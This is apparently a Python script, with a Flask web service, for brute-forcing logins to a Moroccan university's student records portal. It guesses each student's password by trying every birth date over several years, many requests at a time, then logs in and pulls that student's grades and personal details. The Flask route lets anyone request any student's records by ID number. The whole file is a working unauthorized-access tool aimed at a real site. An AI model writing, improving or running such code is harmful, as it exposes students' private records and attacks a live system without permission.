import requests
from datetime import datetime, timedelta
import concurrent.futures
import threading
import sys
import urllib3
from bs4 import BeautifulSoup
import csv
import io
from flask import Flask, request, Response

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class UAEWebsiteBot:
    def __init__(self):
        self.session = requests.Session()
        self.base_url = "https://apoweb-te.uae.ac.ma/dossier_etudiant_fs_tetouan"
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.found = False
        self.correct_date = None
        self.lock = threading.Lock()
        self.print_lock = threading.Lock()

    def check_credentials(self, apogee_number, date_str):
        """Check credentials - return True if 302 redirect (login success)"""
        if self.found:
            return False

        check_url = f"{self.base_url}/check.php"

        form_data = {
            'Login': apogee_number,
            'pass': date_str,
            'submit': ''
        }

        try:
            # don't follow redirects so we can detect 302
            response = self.session.post(check_url, data=form_data, allow_redirects=False, timeout=8, verify=False)

            if response.status_code == 302:
                with self.print_lock:
                    print(f"\n SUCCESS: {date_str}", file=sys.stderr)
                with self.lock:
                    self.found = True
                    self.correct_date = date_str
                return True
            else:
                with self.print_lock:
                    print(f"WRONG: {date_str} (status {response.status_code})", file=sys.stderr)

        except Exception as e:
            with self.print_lock:
                print(f" Error with {date_str}: {e}")

        return False

    def brute_force_dates(self, apogee_number, year, max_workers=20):
        """Try all dates with threading for maximum speed"""
        print(f"Searching for apogee: {apogee_number}, year: {year}\n", file=sys.stderr)

        dates = []
        current_date = datetime(year, 1, 1)
        end_date = datetime(year, 12, 31)

        while current_date <= end_date:
            dates.append(current_date.strftime("%d/%m/%Y"))
            current_date += timedelta(days=1)

        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(self.check_credentials, apogee_number, date): date for date in dates}

            for future in concurrent.futures.as_completed(futures):
                if self.found:
                    # stop remaining futures
                    executor.shutdown(wait=False, cancel_futures=True)
                    return self.correct_date

        if not self.found:
            print("\n No valid date found", file=sys.stderr)
        return None



    def finalize_login_and_get_grades(self, apogee_number, date_str):
        """
        After we've found the correct birthday (date_str), finish login and submit the second form.
        Returns the HTML of the grades page (or None on failure).
        """
        # 1) Re-submit the check.php but allow redirects so session cookies/redirects are followed
        check_url = f"{self.base_url}/check.php"
        form_data = {'Login': apogee_number, 'pass': date_str, 'submit': ''}
        try:
            resp = self.session.post(check_url, data=form_data, allow_redirects=True, timeout=10, verify=False)
        except Exception as e:
            print(f"Error during final login POST: {e}")
            return None

        # After successful login we should be in a session. Now submit the second form.
        # The form action in your snippet was note-resultat.php (relative). Build full URL:
        second_form_url = f"{self.base_url}/note-resultat.php"

        # Payload you provided
        payload = {
            'lf_lp': 'LICENCE',
            'submit': 'Afficher',
            'cod_cmp': 'CFS',
            'lic1': 'LICENCE',
            'cod_cyc': '1',
            'session': '1',
            'ptjury': '1',
            'deug': 'D.E.U.G.'
        }

        try:
            # Submit form and follow redirects
            grades_resp = self.session.post(second_form_url, data=payload, allow_redirects=True, timeout=10, verify=False)
        except Exception as e:
            print(f"Error submitting second form: {e}")
            return None

        # If the response is a redirect (3xx) requests followed it; the final page should contain the table.
        if grades_resp.status_code not in (200, 302):
            print(f"Warning: received status code {grades_resp.status_code} when requesting grades page")

        return grades_resp.text

    @staticmethod
    def extract_student_info(html):
        soup = BeautifulSoup(html, "html.parser")
        
        # The first <div> in <body>, then the <table> inside it
        body_divs = soup.body.find_all("div", recursive=False)
        if not body_divs:
            print("No divs found in body")
            return None

        first_div = body_divs[0]
        table = first_div.find("table")
        if not table:
            print("No table found in first div")
            return None

        # Extract rows
        rows = []
        for tr in table.find_all("tr"):
            cells = [ " ".join(cell.get_text(separator=" ", strip=True).split())
                    for cell in tr.find_all(["th","td"]) ]
            if cells:
                rows.append(cells)
        return rows

    @staticmethod
    def extract_table(html):
        """Parse HTML and extract the first table with class 'table table-bordered'"""
        soup = BeautifulSoup(html, "html.parser")
        table = soup.find("table", class_="table table-bordered")
        if table is None:
            print("Could not find grades table in the page.")
            return None

        # Build rows (preserve rowspan/colspan if needed is complex; we'll extract cells row-by-row)
        rows = []
        for tr in table.find_all("tr"):
            cells = []
            # prefer th first, then td
            for cell in tr.find_all(["th", "td"]):
                # get text and normalize whitespace
                text = " ".join(cell.get_text(separator=" ", strip=True).split())
                cells.append(text)
            if cells:
                rows.append(cells)

        return rows

    @staticmethod
    def print_table_as_text(rows):
        if not rows:
            print("No rows to print.")
            return
        # Find max width per column
        widths = []
        for row in rows:
            while len(widths) < len(row):
                widths.append(0)
            for i, cell in enumerate(row):
                widths[i] = max(widths[i], len(cell))

        # Print rows padded
        for row in rows:
            padded = " | ".join(cell.ljust(widths[i]) for i, cell in enumerate(row))
            print(padded)

    @staticmethod
    def rows_to_csv_string(rows):
        if not rows:
            return ""
        output = io.StringIO()
        writer = csv.writer(output)
        for row in rows:
            writer.writerow(row)
        return output.getvalue()


def main():
    bot = UAEWebsiteBot()

    apogee_number = input("Enter apogee number: ").strip()
    year = int(input("Enter birth year: ").strip())

    result = bot.brute_force_dates(apogee_number, year)

    if not result:
        print("Brute-force did not find a valid date.")
        sys.exit(1)

    # With result (correct date), finalize and get grades page HTML
    html = bot.finalize_login_and_get_grades(apogee_number, result)
    if not html:
        print("Failed to retrieve grades page.")
        sys.exit(1)

    student_info_rows = bot.extract_student_info(html)
    if not student_info_rows:
        print("No info table extracted.")
        sys.exit(1)

    rows = bot.extract_table(html)
    if not rows:
        print("No grades table extracted.")
        sys.exit(1)

    bot.print_table_as_text(student_info_rows)
    bot.print_table_as_text(rows)

    csv_data = bot.rows_to_csv_string(rows)
    # Save CSV locally
    filename = f"grades_{apogee_number}_{result.replace('/', '-')}.csv"
    with open(filename, "w", newline="", encoding="utf-8") as f:
        f.write(csv_data)

    print(f"\nSaved CSV to: {filename}")
    print("\nDone.")


import argparse
import sys

def rows_to_html_table(rows):
    """Convert 2D list of rows into an HTML table"""
    if not rows:
        return "<p>No grades available.</p>"

    html = "<table class='table table-bordered'>"

    # Add header row (first row)
    html += "<thead><tr>"
    for header in rows[0]:
        html += f"<th>{header}</th>"
    html += "</tr></thead>"

    # Add table body
    html += "<tbody>"
    for row in rows[1:]:
        html += "<tr>"
        for cell in row:
            html += f"<td>{cell}</td>"
        html += "</tr>"
    html += "</tbody></table>"

    return html


def run_for_apogee_over_years(apogee_number, years=(2002,2003,2004,2005,2006,2007), max_workers=12):
    bot = UAEWebsiteBot()

    found_date = None
    found_year = None
    # Try each year in order until we find a valid date
    for y in years:
        print(f"[*] Trying year {y}...", file=sys.stderr)
        result = bot.brute_force_dates(apogee_number, y, max_workers=max_workers)
        if result:
            found_date = result
            found_year = y
            break

    if not found_date:
        print("ERROR: brute-force did not find a valid date for any year.", file=sys.stderr)
        return 2

    html = bot.finalize_login_and_get_grades(apogee_number, found_date)
    if not html:
        print("ERROR: failed to retrieve grades page after login.", file=sys.stderr)
        return 3

    student_info_rows = bot.extract_student_info(html)
    if not student_info_rows:
        print("ERROR: no table extracted from info page.", file=sys.stderr)
        return 4
    
    rows = bot.extract_table(html)
    if not rows:
        print("ERROR: no table extracted from grades page.", file=sys.stderr)
        return 4

    info_html = rows_to_html_table(student_info_rows) if student_info_rows else "<p>No student info available</p>"
    grades_html = rows_to_html_table(rows) if rows else "<p>No grades available</p>"
    full_html = info_html + "<br><br>" + grades_html
    sys.stdout.buffer.write(full_html.encode('utf-8'))

    return 0

from flask import Flask, request, Response

app = Flask(__name__)

@app.route("/grades", methods=["GET"])
def get_grades():
    apogee_number = request.args.get("apogee")
    if not apogee_number:
        return "Missing apogee parameter", 400

    max_workers = int(request.args.get("workers", 8))
    years = [2001,2002,2003,2004,2005,2006,2007]

    bot = UAEWebsiteBot()
    found_date = None

    # Brute-force login over years
    for y in years:
        result = bot.brute_force_dates(apogee_number, y, max_workers=max_workers)
        if result:
            found_date = result
            break

    if not found_date:
        return "Could not find valid birth date", 404

    html = bot.finalize_login_and_get_grades(apogee_number, found_date)
    if not html:
        return "Failed to retrieve grades page", 500

    student_info_rows = bot.extract_student_info(html)
    grades_rows = bot.extract_table(html)

    def rows_to_html_table(rows):
        if not rows:
            return "<p>No data available.</p>"
        html = "<table class='table table-bordered'>"
        html += "<thead><tr>" + "".join(f"<th>{h}</th>" for h in rows[0]) + "</tr></thead>"
        html += "<tbody>"
        for row in rows[1:]:
            html += "<tr>" + "".join(f"<td>{c}</td>" for c in row) + "</tr>"
        html += "</tbody></table>"
        return html

    info_html = rows_to_html_table(student_info_rows)
    grades_html = rows_to_html_table(grades_rows)
    full_html = info_html + "<br><br>" + grades_html

    return Response(full_html, mimetype="text/html")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)